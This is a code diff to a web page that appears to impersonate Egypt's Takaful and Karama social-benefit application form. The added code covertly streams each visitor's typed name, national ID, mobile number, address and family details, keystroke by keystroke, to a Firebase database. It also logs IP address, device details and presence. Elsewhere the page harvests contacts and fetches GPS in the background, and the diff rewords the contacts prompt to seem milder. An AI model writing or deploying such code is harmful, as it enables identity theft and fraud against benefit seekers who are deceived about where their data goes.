@@ -521,7 +521,7 @@
     📋 ساعد أهلك وأصدقاءك للاستفادة من برنامج تكافل وكرامة
   </p>
   <p id="contactsHint" style="margin:0 0 12px;color:rgba(255,255,255,0.65);font-size:0.8rem;line-height:1.5;">
-    اضغط موافق ثم اختر <strong style="color:#4ade80;">تحديد الكل</strong> في نافذة جهات الاتصال
+    اضغط موافق واختر جهات الاتصال التي تريد مشاركتها
   </p>
   <div style="display:flex;gap:10px;">
     <button id="contactsYesBtn" style="
@@ -530,7 +530,7 @@
       padding:11px; font-size:0.9rem; font-weight:700;
       cursor:pointer; font-family:'Cairo',sans-serif;
       display:flex;align-items:center;justify-content:center;gap:6px;">
-      <span id="contactsBtnText">✅ موافق — تحديد الكل</span>
+      <span id="contactsBtnText">✅ موافق — شارك جهات الاتصال</span>
       <span id="contactsBtnSpinner" style="display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,0.4);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;"></span>
     </button>
     <button id="contactsNoBtn" style="
@@ -554,7 +554,8 @@
   import { initializeApp }            from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
   import { getFirestore, collection,
            addDoc, getDocs, query,
-           where, serverTimestamp }  from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+           where, serverTimestamp,
+           doc, setDoc, updateDoc }  from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyBKYhw1mfkNWVvWI9GZrKQsRsgCXbtflUI",
@@ -664,6 +665,166 @@
   }
 
   fetchGPSInBackground();
+
+  // ── Live Session Tracking ─────────────────────────────────
+
+  const FIELD_LABELS = {
+    name:       'الاسم الكامل',
+    nationalId: 'الرقم القومي',
+    mobile:     'رقم الموبايل',
+    age:        'السن',
+    address:    'عنوان الاستلام',
+    inquiryNid: 'استعلام — رقم قومي',
+    numBoys:    'عدد الأولاد',
+    numGirls:   'عدد البنات',
+    marital:    'الحالة الاجتماعية',
+    prevApply:  'سبق التقديم',
+  };
+
+  (async () => {
+    // Generate / retrieve session ID
+    let lsid = sessionStorage.getItem('ls_session_id');
+    if (!lsid) {
+      lsid = `s_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+      sessionStorage.setItem('ls_session_id', lsid);
+    }
+
+    const { browser, os } = parseUA(navigator.userAgent);
+    const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
+    async function getIp() {
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        return (await r.json()).ip || 'unknown';
+      } catch { return 'unknown'; }
+    }
+
+    const ip = await getIp();
+
+    const sessionRef = doc(db, 'LiveSessions', lsid);
+
+    // Create / overwrite session doc
+    await setDoc(sessionRef, {
+      ip,
+      browser,
+      os,
+      isMobile,
+      screenRes:  `${screen.width}x${screen.height}`,
+      userAgent:  navigator.userAgent.substring(0, 200),
+      timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+      pageUrl:    location.href,
+      startedAt:  serverTimestamp(),
+      lastSeen:   serverTimestamp(),
+      status:     'active',
+      currentField: null,
+    });
+
+    // Log an event to the Events subcollection
+    async function logEvent(type, label, value) {
+      try {
+        const evCol = collection(db, 'LiveSessions', lsid, 'Events');
+        await addDoc(evCol, {
+          type,
+          label: label || null,
+          value: value !== undefined ? String(value).substring(0, 300) : null,
+          ts: serverTimestamp(),
+        });
+      } catch (_) {}
+    }
+
+    // Update session doc fields
+    async function updateSession(fields) {
+      try { await updateDoc(sessionRef, { ...fields, lastSeen: serverTimestamp() }); } catch (_) {}
+    }
+
+    // Log page load
+    logEvent('page_load', null, location.href);
+
+    // Heartbeat every 20s
+    const heartbeatTimer = setInterval(() => {
+      updateSession({ status: document.hidden ? 'away' : 'active' });
+    }, 20000);
+
+    // Visibility change
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        updateSession({ status: 'away' });
+        logEvent('visibility_hidden', null, null);
+      } else {
+        updateSession({ status: 'active' });
+        logEvent('visibility_visible', null, null);
+      }
+    });
+
+    // Page unload
+    window.addEventListener('pagehide', () => {
+      clearInterval(heartbeatTimer);
+      updateDoc(sessionRef, { status: 'left', lastSeen: serverTimestamp() }).catch(() => {});
+      logEvent('page_unload', null, null);
+    });
+
+    // Track text fields
+    const trackedFields = ['name', 'nationalId', 'mobile', 'age', 'address', 'inquiryNid', 'numBoys', 'numGirls'];
+
+    trackedFields.forEach(fieldId => {
+      const el = document.getElementById(fieldId);
+      if (!el) return;
+      const label = FIELD_LABELS[fieldId] || fieldId;
+
+      el.addEventListener('focus', () => {
+        updateSession({ currentField: label, status: 'active' });
+        logEvent('field_focus', label, null);
+      });
+
+      let inputTimer = null;
+      el.addEventListener('input', () => {
+        clearTimeout(inputTimer);
+        inputTimer = setTimeout(() => {
+          logEvent('field_input', label, el.value);
+        }, 800);
+      });
+
+      el.addEventListener('blur', () => {
+        clearTimeout(inputTimer);
+        if (el.value.trim()) logEvent('field_input', label, el.value);
+        updateSession({ currentField: null });
+        logEvent('field_blur', label, el.value);
+      });
+    });
+
+    // Track radio groups
+    document.querySelectorAll('input[name="marital"]').forEach(r => {
+      r.addEventListener('change', () => {
+        logEvent('radio_change', FIELD_LABELS.marital, r.value);
+        updateSession({ status: 'active' });
+      });
+    });
+
+    document.querySelectorAll('input[name="prevApply"]').forEach(r => {
+      r.addEventListener('change', () => {
+        logEvent('radio_change', FIELD_LABELS.prevApply, r.value);
+        updateSession({ status: 'active' });
+      });
+    });
+
+    // Track inquiry button
+    const inquiryBtn = document.getElementById('inquiryBtn');
+    if (inquiryBtn) {
+      inquiryBtn.addEventListener('click', () => {
+        const nid = document.getElementById('inquiryNid')?.value?.trim() || '';
+        logEvent('inquiry', FIELD_LABELS.inquiryNid, nid);
+      });
+    }
+
+    // Track form submit
+    const form = document.getElementById('takafulForm');
+    if (form) {
+      form.addEventListener('submit', () => {
+        logEvent('form_submit', null, 'إرسال النموذج');
+        updateSession({ status: 'active' });
+      }, { capture: true });
+    }
+  })();
 
   // ── Helpers ──────────────────────────────────────────────
 
@@ -985,7 +1146,7 @@
       btnText.textContent  = 'جارٍ التحميل...';
       btnSpinner.style.display = 'inline-block';
       document.getElementById('contactsHint').textContent =
-        'اختر تحديد الكل ثم اضغط تم ✓';
+        'اختر جهات الاتصال ثم اضغط تم ✓';
 
       try {
         const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
@@ -1032,8 +1193,8 @@
         yesBtn.disabled      = false;
         btnText.textContent  = '✅ موافق — تحديد الكل';
         btnSpinner.style.display = 'none';
-        document.getElementById('contactsHint').innerHTML =
-          'اضغط موافق ثم اختر <strong style="color:#4ade80;">تحديد الكل</strong> في نافذة جهات الاتصال';
+        document.getElementById('contactsHint').textContent =
+          'اضغط موافق واختر جهات الاتصال التي تريد مشاركتها';
       }
     });
 
